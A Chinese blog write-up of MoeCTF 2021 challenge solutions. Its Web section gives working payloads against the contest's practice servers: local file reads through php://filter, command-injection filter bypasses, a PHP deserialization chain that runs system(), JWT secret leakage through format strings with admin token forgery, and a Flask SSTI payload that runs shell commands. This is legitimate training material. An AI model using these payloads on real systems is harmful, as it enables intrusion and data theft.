---
title: MoeCTF2021_WP
date: 2021-09-24 14:06
tags: [moectf]
categories: CTF
top: true
# img: /img/moectf.jpg
---

<font color='cornflowerblue'>**只有web有全部题目的题解,其余看题目有趣程度(x)**</font>

[官方题解](https://github.com/XDSEC/moeCTF_2021/blob/master/Official_WriteUp/Official_Write_Ups.md)

<font color='red'>我的博客：</font>www.wkingxc.com

## 一、Web

前四题全是指南，用Firefox渗透版或Burpsuite即可

### (1)2048

打开界面发现敏感信息漏洞![](https://i.loli.net/2021/09/21/gbu8cPvH3lyhSRZ.png)

传参指定参数即可

![](https://i.loli.net/2021/09/21/1sKfCVTO9hNyS67.png)

<font color='red'>非预期解：</font>

![](https://i.loli.net/2021/09/21/kGuIPxVwf6U42nD.png)

玩把游戏，使分数变成68![](https://i.loli.net/2021/09/21/Yn9jElIQbZfXGDk.png)

找到数据地址，进行修改，继续玩游戏直至成功。![](https://i.loli.net/2021/09/21/Lgti4hv3oHzP16S.png)

![](https://i.loli.net/2021/09/21/L8vMYWEk2Ttcgiy.png)

### (2)Web_Inc

![](https://i.loli.net/2021/09/21/DCytjM7OwfbKoAq.png)

题目要求是a,b不相等，但它们的md5值严格相等，<font color='red'>注意是===而不是==</font>

可以构造数组绕过，`a[]=1 b[]=2`,传参得到flag

![](https://i.loli.net/2021/09/21/blLWIVTosDG2YmF.png)

### (3)ezinclude

此题用php://input传参发现没有反应，估计是input被屏蔽了，尝试使用<font color='red'>filter</font>协议读取flag.php的源码，并用base64解密

`php://filter/read=convert.base64-encode/resource=flag.php`

![](https://i.loli.net/2021/09/21/HF2gSVjakIBxo73.png)

> 解密得到：<?$flag="moectf{xdsec6asdgas7ahfsfaxczc}";?>

### (4)babyRCE

如题，是一道远程漏洞执行

![](https://i.loli.net/2021/09/21/a3XI8vtYu21kQLj.png)

根据经验和积累，可以用`\`来绕过单词限制，用`${IFS}`或者`$IFS`绕过空格限制

> system（）函数里执行的是各种shell命令 shell命令中的\是转义字符 但是\后跟的是非元字符，与没有加\的效果是一样的

`l\s` , `ca\t${IFS}f\lag.php`,用cat绕过后发现没反应，注意使用cat要查看源代码

![](https://i.loli.net/2021/09/21/RaSxKvV7TCZ8Xbi.png)

最后可以使用payload:`rce=ta\c${IFS}f\lag.php`,拿到flag

![](https://i.loli.net/2021/09/21/gjX7arHvcQfIihp.png)

### (5)Do you know HTTP?

这题考察的应该是对HTTP头的理解，采用Burpsuite抓包修改进行解题

共有四关，1.用'HS'来请求试试？改成`HS`

<img src="https://i.loli.net/2021/09/21/lf4NeDthuJAEbpx.png" alt=""  />

2.用本地ip访问
`X-forwarded-for:127.0.0.1`

![](https://i.loli.net/2021/09/21/bVkfSq4zwtA27XE.png)

3.网页来源

`referer:www.ltyyds.com`

![](https://i.loli.net/2021/09/21/HduOYyIQwqanFzU.png)

4.伪造浏览器

`User-Agent: LT`

![](https://i.loli.net/2021/09/21/Fr5QYVbjnRwShzq.png)

### (6)ezunserialize

```php
<?php

class entrance
{
    public $start;

    function __construct($start)
    {
        $this->start = $start;
    }

    function __destruct()
    {
        $this->start->helloworld();
    }
}

class springboard
{
    public $middle;

    function __call($name, $arguments)
    {
        echo $this->middle->hs;
    }
}

class evil
{
    public $end;

    function __construct($end)
    {
        $this->end = $end;
    }

    function __get($Attribute)
    {
        eval($this->end);
    }
}

if(isset($_GET['serialize'])) {
    unserialize($_GET['serialize']);
} else {
    highlight_file(__FILE__);
}
```

先来了解一些魔术方法：

| __construct()    | 具有构造函数的类会在每次创建新对象时先调用此方法             |
| ---------------- | ------------------------------------------------------------ |
| **__destruct()** | 某个对象的所有引用都被删除或者当对象被显式销毁时执行         |
| **__get()**      | 读取不可访问<font color='red'>属性的值</font>,`__get`会被自动调用 |
| **__call()**     | 在对象中调用一个不可访问<font color='red'>方法</font>时,`__call`会自动被调用 |
| **__wakeup()**   | `unserialize()` 会检查是否存在一个 `__wakeup()`方法。如果存在，则会先调用 `__wakeup` 方法，预先准备对象需要的资源。 |

分析上述代码，得知最终入口为evil对象调用的eval函数，从而构造传播链

> entrance-->springboard-->evil

可以自行给springboard类增添构造函数

```php
class springboard
{
    public $middle;
	function __construct($x)
	{
		$this->middle = $x;
	}
    function __call($name, $arguments)
    {
        echo $this->middle->hs;
    }
}
$e = new evil("system('cat /flag');");
$s = new springboard($e);
$a = new entrance($s);
echo serialize($a);
```

得到序列化后的结果 ：`O:8:"entrance":1:{s:5:"start";O:11:"springboard":1:{s:6:"middle";O:4:"evil":1:{s:3:"end";s:20:"system('cat /flag');";}}}`

最终取得flag：

![](https://i.loli.net/2021/09/24/jlzvO5bMwC68ZWr.png)

### (7)地狱通信???

实际上比 改 简单，但有时间限制，看以下题解就行了

### <font color='red'>(8)地狱通信—改</font>

> 实际上地狱通信比这个简单，但有时间限制，这题做出来地狱通信也就没有问题了

```php
from flask import Flask, render_template, request, session, redirect, make_response
from secret import secret, headers, User
import datetime
import jwt

app = Flask(__name__)


@app.route("/", methods=['GET', 'POST'])
def index():
    f = open("app.py", "r")
    ctx = f.read()
    f.close()
    res = make_response(ctx)
    name = request.args.get('name') or ''
    if 'admin' in name or name == '':
        return res
    payload = {
        "name": name,
    }
    token = jwt.encode(payload, secret, algorithm='HS256', headers=headers)
    res.set_cookie('token', token)
    return res


@app.route('/hello', methods=['GET', 'POST'])
def hello():
    token = request.cookies.get('token')
    if not token:
        return redirect('/', 302)
    try:
        name = jwt.decode(token, secret, algorithms=['HS256'])['name']
    except jwt.exceptions.InvalidSignatureError as e:
        return "Invalid token"
    if name != "admin":
        user = User(name)
        flag = request.args.get('flag') or ''
        message = "Hello {0}, your flag is" + flag
        return message.format(user)
    else:
        return render_template('flag.html', name=name)


if __name__ == "__main__":
    app.run()
```

python编写网页，主要有两大块，第一个函数会屏蔽传参的'admin'，并设置cookie留给第二个函数使用，第二个函数又只能用admin访问flag.html

所以有两个思路：1.绕过第一个admin而在第二个中显示，发现用`%00`截断可以显示出用户名为admin，但不能打开fllag.html

<font color='red'>2.伪造这个token</font>

查询到python的format函数在网页中有漏洞，参考链接：[从两道CTF实例看python格式化字符串漏洞_format (sohu.com)](https://www.sohu.com/a/296121261_120045376)

可以创建普通用户通过该漏洞，带出构造token的secret和headers，从而构造admin的token

![](https://i.loli.net/2021/09/21/FtwkxlYZVJECBbO.png)

![](https://i.loli.net/2021/09/21/ZwS3b2vdgEW7UYe.png)

用`0.__class__.__init__.__globals__[]`带出secret和headers

![](https://i.loli.net/2021/09/21/XoKOJLFgbtmxW2y.png)



利用python的**pyjwt**库来伪造admin的token：(但使用时是用 import jwt)

```python
payload = {"name": 'admin', }
secret = 'u_have_kn0w_what_f0rmat_i5'
headers = {'alg': 'HS256', 'typ': 'JWT'}
token = jwt.encode(payload, secret, algorithm='HS256', headers=headers)
print(token)
```

token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4ifQ.ONh7uQwunkVjB4_ZwuLNIHBGbciqLAtJxQF81elyqBc

在hello页面发送，得到flag

![](https://i.loli.net/2021/09/21/b4ztBhd7ov1sQjY.png)



### <font color='red'>(9)让 我 访 问</font>

> 未做出

本题知识点：SSTI

SSTI这篇文章写的很好：[CTF|有关SSTI的一切小秘密【Flask SSTI+姿势集+Tplmap大杀器】](https://zhuanlan.zhihu.com/p/93746437)

在对post提交的username和passwd进行渗透无果后，转到对register页面的研究上

<font color='red'>对于会自动跳转的页面一定要使用bp抓包分析</font>

![](https://i.loli.net/2021/09/24/iCDM5RZLwSozUkN.png)

发现页面跳转是通过“第三方”跳转的，更改为abc，发现abc被显示出来，尝试SSTI注入

![](https://i.loli.net/2021/09/24/q7cuzknBXM49HNU.png)

**成功发现注入点!**

先获取object基本类的子类

```bash
{{''.__class__.__mro__[1].__subclasses__()}}
```

找到可以利用的os类，通常可以找到`<class'os._wrap_close'>`

```bash
{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat /flag").read()')}}
```

![](https://i.loli.net/2021/09/24/GosJh6QWPbeVkRf.png)







### <font color='red'>(10)fake game</font>

> 未做出

题目环境还未恢复，知识点是`原型链污染`



## 二、Crypto

(注释都是自己加的)

### (1)beginOfCrypto

原题：

```python
import math
flag = xxx
# 将flag每个字符的ascii码值存入列表
data = list(map(ord, flag))
cip = []
for i in range(len(data)):
    cip.append(math.e ** data[i])
print(cip)
'''
[2.178203880729008e+47, 1.6094870669615087e+48, 7.307059979368028e+43, 9.889030319346894e+42, 2.3886906014249767e+50, 1.9862648361376436e+44,
 2.6195173187490456e+53, 9.889030319346894e+42, 7.016735912097614e+20, 2.178203880729008e+47, 7.307059979368028e+43, 1.811239082889014e+41,
 1.6094870669615087e+48, 5.920972027664636e+47, 214643579785915.7, 3.6379709476087856e+42, 7.307059979368028e+43, 5.399227610580139e+44,
 3.989519570547194e+45, 5.920972027664636e+47, 1.811239082889014e+41, 3.5451311827611436e+52, 1.6094870669615087e+48, 6.493134255664421e+50,
 3.23274119108484e+49, 1.811239082889014e+41, 1.2523631708422093e+29, 3.23274119108484e+49, 3.5451311827611436e+52, 4.375039447261315e+48,
 2.3886906014249767e+50, 7.016735912097614e+20, 1.811239082889014e+41, 9.889030319346894e+42, 3.831008000716566e+22, 3.23274119108484e+49,
 1.4093490824269349e+22, 1.4093490824269349e+22, 3.23274119108484e+49, 1.9355760420357097e+54]
'''
```

分析可知，只需要反向解出data列表，再转为字符即可，脚本如下：

```python
import math
def begin_of_crypto():
    m = [数字如上，省略]
    for i in m:
        x = int(math.log(i))
        print(chr(x), end='')

begin_of_crypto()
```

flag：`moectf{c0me_on!begin_your_Crypt0_c4r33r}`

### (2)BabyMultiple

分析代码可知，每个字符加密后对应一个字符，反向爆破即可

### (3)LazyRSA

从这里开始逐渐接触到各式各样的RSA题目，太神奇了！

具体原理不再阐述，上网搜索或者查看初等数论

```python
#已知p,q,c
n = p * q
phi = (p-1) * (q-1)
e = 0x10001
d = inverse(e,phi)
print(long_to_bytes(pow(c,d,n)))
#moectf{w0w_yOU_Know_h0w_70_d3crypt_th3_RSA}
```

### (4)PRintNewG

一道伪随机数生成题，解题需要用到数论知识求解方程组

```python
from Crypto.Util.number import *

n = 164955381960104851576442781839629371483790790743830073857213053104860144345367
c1 = 67066424717605861916529090048670931008913194546199003522357504998012803616537
c2 = 14585402872351563180055857554749250191721167730349724393021149201170995608751
c3 = 68393939370424772490169906192546208899639826391163845848999554903218827210979

t1 = c1 - c2
inverse_x = inverse(t1, n)
a = ((c2 - c3) * inverse_x) % n
b = (c2 - a * c1) % n
inverse_y = inverse(a, n)
seed = ((c1 - b) * inverse_y) % n
print(long_to_bytes(seed))
#b'moectf{PR1nt_N3w_G_s0_e45y}'
```

### (5)NumberTheory-FeeeeeMa

题中两个素数很是接近，用yafu工具进行分解得到p,q即可正常求解

### (6)BBBBBBBackpack

手算几条，根据商，余数，倒着乘起来即可

### (7)FesitelTripple

原题：

```python
from Crypto.Util.number import *
from Crypto.Cipher import AES


def encrypt(plaintext, keystream):
    assert len(plaintext) == 32
    assert len(keystream) == 48

    left = plaintext[:16]
    right = plaintext[16:]

    for i in range(3):
        aes = AES.new(keystream[i * 16:i * 16 + 16], AES.MODE_ECB)
        new_right = long_to_bytes(bytes_to_long(aes.encrypt(right)) ^ bytes_to_long(left))
        new_left = right
        left = new_left
        right = new_right
    return left + right


def decrypt(ciphertext, keystream):
    assert len(ciphertext) == 32
    assert len(keystream) == 48

    left = ciphertext[:16]
    right = ciphertext[16:]

    for i in range(3):
        aes = AES.new(keystream[i * 16:i * 16 + 16], AES.MODE_ECB)
        old_right = left
        old_left = long_to_bytes(bytes_to_long(right) ^ bytes_to_long(aes.encrypt(old_right)))
        left = old_left
        right = old_right

    return left + right


flag = xxx
key1 = b'it_is_just_the_first_time_key_and_encrypt_twice~'
key2 = b'y0u can d0 what y0u w4nt t0 do!Go0d wishes~do it'

cipher = encrypt(flag, key1)
cipher = decrypt(cipher, key2)
cipher = encrypt(cipher, key1)

print(bytes_to_long(cipher))
# 8465484536296110246056264738507061716988653458463168290845919961738127701895
```

我是将加密和解密看成了两个加密算法，分别写出了对应的两个解密算法

如下：

```python
def encrypt2(c, key):
    assert len(c) == 32
    assert len(key) == 48
    left = c[:16]
    right = c[16:]
    for i in range(3):
        aes = AES.new(key[(2 - i) * 16:(3 - i) * 16], AES.MODE_ECB)
        old_right = left
        old_left = long_to_bytes(bytes_to_long(right) ^ bytes_to_long(aes.encrypt(old_right)))
        left = old_left
        right = old_right
    return left + right
    
def decrypt2(c, key):
    assert len(c) == 32
    assert len(key) == 48
    left = c[:16]
    right = c[16:]
    for i in range(3):
        aes = AES.new(key[(2 - i) * 16:(3 - i) * 16], AES.MODE_ECB)
        old_left = right
        old_right = long_to_bytes(bytes_to_long(left) ^ bytes_to_long(aes.encrypt(right)))
        left = old_left
        right = old_right
    return left + right
    
def solve():
    key1 = b'it_is_just_the_first_time_key_and_encrypt_twice~'
    key2 = b'y0u can d0 what y0u w4nt t0 do!Go0d wishes~do it'
    result = 8465484536296110246056264738507061716988653458463168290845919961738127701895
    c3 = long_to_bytes(result)
    c2 = encrypt2(c3, key1)
    c = decrypt2(c2, key2)
    flag = encrypt2(c, key1)
    print(flag)
```

逆着解回去即可(我是写复杂了吗qwq)

### (8)NumberTheory-Powwwwwer

共模攻击，面向搜索引擎写脚本：

```python
from Crypto.Util.number import *
from gmpy2 import *

c1 = 47220438825147485602004110821622560065904207675219860468929327492230243119464967323930295623259686691976072363819976125368307866223981062386682077438030452670319556977872343275419275297828846355087444641575933688543206152050119271402939885941719672725566836549228027040543887994457719131600949478670978241146
c2 = 115435415972673976853578931507112950322194896557724940548983105717498084920603530063295392396344585245149536619546139549595643165285610305977637286040529163780201012187105549728000887169595946039777889559399483628995380569296124138575774025562472143420878790970785857061634021973901034670780393435693955936244
n = 136101507305579392638535644920761633964164170724862786826983346232384615490056114520867809528578619044234996682189743771790469301482774597055261893015794231752161620186891313083697906603842794202124169703689691049507643124840305144271549786654248958903748746153284903228556081709492696702282014035715848536699
e1 = 0x114514
e2 = 11451401
s = gcdext(e1, e2)
s1 = s[1]
s2 = s[2]

m = pow(c1, s1, n) * pow(c2, s2, n) % n #这一步是搜的，没想到要%n这么多次
print(long_to_bytes(m))
print(m > n) # dbt说要使m小于n
```

### (9)NumberTheory-MyGrandson

中国剩余定理

非预期解：e比较小，开3次方正常解，结果竟然就出来了

官方预期解：

```python
from Crypto.Util.number import*
import gmpy2

n_list = 
c_list = 
e = 0x3
N = 1 
for i in n_list:
    N *= i

Ni = []
ti = []
for i in range(len(n_list)):
    Ni.append(N//n_list[i])
    ti.append(gmpy2.invert(Ni[i],n_list[i]))

sum = 0
for i in range(len(n_list)):
    sum += c_list[i] * ti[i] * Ni[i]

print(long_to_bytes(gmpy2.iroot(sum % N,e)[0]))
```

## 三、Misc

<font color='cornflowerblue'>用谷歌比百度真的太容易找到对的东西了!</font>

### (1)find_me

用010Editor打开拉到最后即可找到flag

### (2)Macross

去谷歌搜索mrf文件怎么打开，给出了软件建议：**MacroRecorder**

发现是记录鼠标轨迹的文件，打开画图，点击play，即可画出flag

### (3)homework

word文档隐写术

1.先用`格式刷`恢复正常段落格式发现一半flag

![image-20210924151122930](https://i.loli.net/2021/09/24/9OfBvmqDg6GWrHe.png)

2.改后缀为.zip，在document.xml中，疑似是正确答案的下方发现了另一半flag

![](https://i.loli.net/2021/09/24/KysmEInGoabUqVM.png)



### (4)White Album

用tweakpng打开，发现警告提示，说明图片大小可能被改变了

![](https://i.loli.net/2021/09/24/szq6EfvFn35dS7P.png)

尝试改变Height为一个较大值，Width不可随便更改

<img src="https://i.loli.net/2021/09/24/WbrGIopXcFEMBYO.png" alt="" style="zoom: 67%;" />

发现奇怪的码，后听noah说是一个介于条形码和二维码之间的[pdf417码](https://baike.baidu.com/item/PDF417%E4%BA%8C%E7%BB%B4%E6%9D%A1%E7%A0%81/6054434?fr=aladdin)，用在线扫码网站扫码可出答案

![](https://i.loli.net/2021/09/24/dvfwjZUOKyClDWR.png)

### (5)Phone call

将音频用频谱分析软件打开

![](https://i.loli.net/2021/09/24/8nzZTmi7hAcKkvM.png)

结合数字声音的频率合成原理

![](https://i.loli.net/2021/09/24/cSpaHYQn8R2DEgZ.png)

逐个找到上下峰，即可找到对应数字

### (6)社工题

Bing或者Google搜索`Noah的博客`

先找到这个：[About NoahBox | NoahBox (noahtie.github.io)](https://noahtie.github.io/about/)，点击签订契约转到第二个

第二个：[诺亚城主 (lofter.com)](https://masternoah.lofter.com/)，点击上面的i，到第三个

第三个：[留言版 | Noah's TRPG Box (noahbox.github.io)](https://noahbox.github.io/guestbook/) 留言簿中发现这个<img src="https://i.loli.net/2021/09/24/Ckd7RgP9852LpbQ.png" alt="" style="zoom:50%;" />

在侧边栏找到github地址，进入发现被hacked的仓库有摩斯密码，解密即可

### (7)诺亚的日记

**此题有大坑：**<font color='red'>kali或者最新版的wireshark无法用tshark分解出usb流量</font>

参考链接：[CTF流量分析常见题型(二)-USB流量](https://qwzf.github.io/2020/08/01/CTF流量分析常见题型(二)-USB流量/)

在win下下载老版本的wireshark，使用命令提取usb流量

```bash
tshark -r usb.pcap -T fields -e usb.capdata > usbdata.txt
```

得到usbdata.txt，并删除其中所有空行，用python脚本分析流量

我得到的数据含有冒号，所有根据上面参考链接，选择[6:8]

```python
normalKeys = {
    "04": "a", "05": "b", "06": "c", "07": "d", "08": "e",
    "09": "f", "0a": "g", "0b": "h", "0c": "i", "0d": "j",
    "0e": "k", "0f": "l", "10": "m", "11": "n", "12": "o",
    "13": "p", "14": "q", "15": "r", "16": "s", "17": "t",
    "18": "u", "19": "v", "1a": "w", "1b": "x", "1c": "y",
    "1d": "z", "1e": "1", "1f": "2", "20": "3", "21": "4",
    "22": "5", "23": "6", "24": "7", "25": "8", "26": "9",
    "27": "0", "28": "<RET>", "29": "<ESC>", "2a": "<DEL>", "2b": "\t",
    "2c": "<SPACE>", "2d": "-", "2e": "=", "2f": "[", "30": "]", "31": "\\",
    "32": "<NON>", "33": ";", "34": "'", "35": "<GA>", "36": ",", "37": ".",
    "38": "/", "39": "<CAP>", "3a": "<F1>", "3b": "<F2>", "3c": "<F3>", "3d": "<F4>",
    "3e": "<F5>", "3f": "<F6>", "40": "<F7>", "41": "<F8>", "42": "<F9>", "43": "<F10>",
    "44": "<F11>", "45": "<F12>"}
shiftKeys = {
    "04": "A", "05": "B", "06": "C", "07": "D", "08": "E",
    "09": "F", "0a": "G", "0b": "H", "0c": "I", "0d": "J",
    "0e": "K", "0f": "L", "10": "M", "11": "N", "12": "O",
    "13": "P", "14": "Q", "15": "R", "16": "S", "17": "T",
    "18": "U", "19": "V", "1a": "W", "1b": "X", "1c": "Y",
    "1d": "Z", "1e": "!", "1f": "@", "20": "#", "21": "$",
    "22": "%", "23": "^", "24": "&", "25": "*", "26": "(", "27": ")",
    "28": "<RET>", "29": "<ESC>", "2a": "<DEL>", "2b": "\t", "2c": "<SPACE>",
    "2d": "_", "2e": "+", "2f": "{", "30": "}", "31": "|", "32": "<NON>", "33": "\"",
    "34": ":", "35": "<GA>", "36": "<", "37": ">", "38": "?", "39": "<CAP>", "3a": "<F1>",
    "3b": "<F2>", "3c": "<F3>", "3d": "<F4>", "3e": "<F5>", "3f": "<F6>", "40": "<F7>",
    "41": "<F8>", "42": "<F9>", "43": "<F10>", "44": "<F11>", "45": "<F12>"}
output = []
keys = open('b.txt')
for line in keys:
    try:
        if line[0] != '0' or (line[1] != '0' and line[1] != '2') or line[3] != '0' or line[4] != '0' or line[
            9] != '0' or line[10] != '0' or line[12] != '0' or line[13] != '0' or line[15] != '0' or line[16] != '0' or \
                line[18] != '0' or line[19] != '0' or line[21] != '0' or line[22] != '0' or line[6:8] == "00":
            continue
        if line[6:8] in normalKeys.keys():
            output += [[normalKeys[line[6:8]]], [shiftKeys[line[6:8]]]][line[1] == '2']
        else:
            output += ['[unknown]']
    except:
        pass

keys.close()

flag = 0
print("".join(output))
for i in range(len(output)):
    try:
        a = output.index('<DEL>')
        del output[a]
        del output[a - 1]
    except:
        pass

for i in range(len(output)):
    try:
        if output[i] == "<CAP>":
            flag += 1
            output.pop(i)
            if flag == 2:
                flag = 0
        if flag != 0:
            output[i] = output[i].upper()
    except:
        pass

print('output :' + "".join(output))

```

从而得到日记

### (8)flipflipflip

> 未做出

打开文件发现末尾是`=`，可能用到了base64编码，因文件较大，复制粘贴会卡，选用python做题

```python
f = open('task', 'rb')
content = f.read()
f.close()
```

对content第一次解码，查看头尾

```python
content = base64.decodebytes(content)
print(content[:10])  # b'=0DME1URxU'
print(content[-10:-1])  # b'XRXl1V41m'
```

发现=变到了前方，需要进行翻转字符串，<font color='red'>如果此时继续编码则会报错</font>

所以思路出来了：不断编码，报错就翻转再编码，直至出现moe为止

脚本如下：

```python
while True:
    try:
        data = base64.decodebytes(content)
        data.decode('utf-8') #注意要进行解码
    except Exception:
        data = base64.decodebytes(content[::-1])
        data.,decode('utf-8')
    if b'moe' in data:
        print(data)
        break
    content = data
    #b'moectf{fffffflipppppp}'
```

### (9)好康的

> 已经形成刻板印象了，只知道隐写，忘记视频分离字幕了，哎……

用potplayer打开视频，然后将字幕另存为1.ass，打开后发现最后一行为flag

![](https://i.loli.net/2021/09/25/gB9Y4Z8IwPEqed7.png)

## 四、Classical Cipher

超能CTF工具网页：[CTF在线工具)](http://ctf.ssleye.com/)，有些可能不太好用

### (1)Augustine's Way

没啥好说的，就是<font color='red'>凯撒密码</font>

### (2)OldButPopular

原文：qj3r_y31s{vxk7_hig__0_a}g4ax_x0x540slv

这题看{}的顺序有点混乱，尝试用<font color='red'>栅栏密码</font>爆破，得出栏数为5时为：`qsigxj{g453v_a4rx_x0_k0_sy7_xl3_a0v1h}`

再用凯撒移位4解决为：`moectf{c453r_w4nt_t0_g0_ou7_th3_w0r1d}`

> 或者直接先用凯撒密码，因为栅栏密码的第一位是不会变的，可以计算偏移

### (3)Augustine's Way#2

原文：eg][l^sdm(i)YfWqq\-u

此题是变式的移位密码，网页上的只对字母有效，此题猜测是ascii码偏移

```python
m = 'eg][l^sdm(i)YfWqq\-u'
for i in m:
    print(chr(ord(i) + 8), end='')
```

得出flag:`moectf{lu0q1an_yyd5}`

### (4)Ez Vigenere

原文：dlcawx{kec_ihq_fc_tgjwebpc_lk_iuwwgk}

[维吉尼亚密码在线转换-在线工具 (metools.info)](http://www.metools.info/code/c71.html?ivk_sa=1024320u)

维吉尼亚密码相当于字母表对应转换，找到dlcawx解密成moectf的密钥即可

> 其实我解出来rx之后我就知道后面是yyds了，结果还真的对了！(这就是心理学的奥秘吗)

![](https://i.loli.net/2021/09/21/nPIyArTxgXKZfEo.png)

### (5)モンスターを縫う！

翻译标题：缝合怪！

大概意思就是将5个文件解密出的明文合并在一起吧！题目如下：

```
npfdug{dm@
// key 1

egmetq
// key moectf

_ihrcpe
// key 2

ABAAA

ce3g
// B?13!

- -.-- ..--.- --. ----- ----- -.. -.-.-- -----.-
```

1.凯撒密码

移动1位得：`moectf{cl@`

2.维吉尼亚密码

从密文和密钥长度相同可以尝试维吉尼亚密码，得：`ssical`

3.栅栏密码

有点像cipher，栏数为2得：`_cipher`

4.培根密码

典型的培根密码：`i`

5.Rot13

得：`pret`

> 解出12346，发现5,6,间像是 pretty good，于是去CTF在线工具去试，最终成功

6.摩斯密码

最好将摩斯密码的空格转换为`/`后再去合规的网站去解密，不然容易出错或者漏信息

```
-/-.--/..--.-/--./-----/-----/-../-.-.--/-----.-
```

解密得：`TY_G00D!%u7d`，%u7d，就是十六进制的7d对应的ascii码的字符`}`

合在一起就是答案，记得小写

## 五、Reverse

### (1)EinfachRe

![](https://i.loli.net/2021/09/24/ArXqZM9byDLevfc.png)

分析得，需要通过`enflag`和`‘moectf’`进行异或得到{}里的内容

附上python脚本：

```python
def EinfachRe():
    enflag = [0x28, 0x15, 0x3a, 0x1b, 0x44, 0x14, 6] #在IDA中找到相应值
    flag = 'moectf'
    for i in range(6):
        print(chr(ord(flag[i]) ^ enflag[i]), end='')
```

得到：`Ez_x0r`,从而得到flag

### (2)Realezpy

利用`uncompyle6`反编译pyc文件得到py文件，

```python
import time
c = [119, 121, 111, 109, 100, 112, 123, 74, 105, 100, 114, 48, 120, 95, 49, 99, 95, 99, 121, 48, 121, 48, 121, 48, 121, 48, 95, 111, 107, 99, 105, 125]

def encrypt(a):
    result = []
    for i in range(len(a)):
        if ord('a') <= ord(a[i]) <= ord('z'):
            result.append((ord(a[i]) + 114 - ord('a')) % 26 + ord('a'))
        elif ord('A') <= ord(a[i]) <= ord('Z'):
            result.append((ord(a[i]) + 514 - ord('A')) % 26 + ord('A'))
        else:
            result.append(ord(a[i]))
    else:
        return result

ipt = input('Plz give me your flag:')
out = encrypt(ipt)
if len(ipt) != len(c):
    print('Wrong lenth~')
    exit()
else:
    for i in range(len(c)):
        if out[i] != c[i]:
            print('Plz try again?')
            exit()
        else:
            print('Congratulations!!!')
            time.sleep(1)
            print('enjoy the beauty of python ~~~ ')
            import this

```

分析后用脚本爆破解密即可

### (3)A_game

思路：这貌似是个数独游戏，程序提供了9X9的数独，横向往下填写数独表格，用户输入的值将写入内存中空着的值

找到内存值，在线求解数独，输入数据，运行程序获得flag

### (4)大佬请喝coffee

Java逆向题，直接拖进IDEA智能反编译，再分析程序的思路即可

> 应该是求解9元一次方程组，得到相应拿到flag的值

### (5)ez_Algorithm

简单算法题，将递归改为递推后，记录内存数据，写个python脚本即可解出

### (6)clothes

先用脱壳工具检测它的加壳方式，再在网上找到了对应的脱壳工具

脱壳完成后就可以拖进IDA中分析了，程序本体代码看起来并不是很难

## 六、PWN

整个pwn模块是速成的，差不多了解了整数溢出，栈的执行原理之类的知识

通过覆盖栈区的返回地址从而跳转到后门函数

`printf`字符串漏洞令我大开眼界，通过%p找到偏移量，再通过%$xn改变地址值

只了解过一些简单的rop链，把/bin/sh连到system的后边

如果没有该字符串，可以通过gets等函数手动写到可用的.bss区

> 这部分知识可能来的快，去的也快，不作详细讲解了
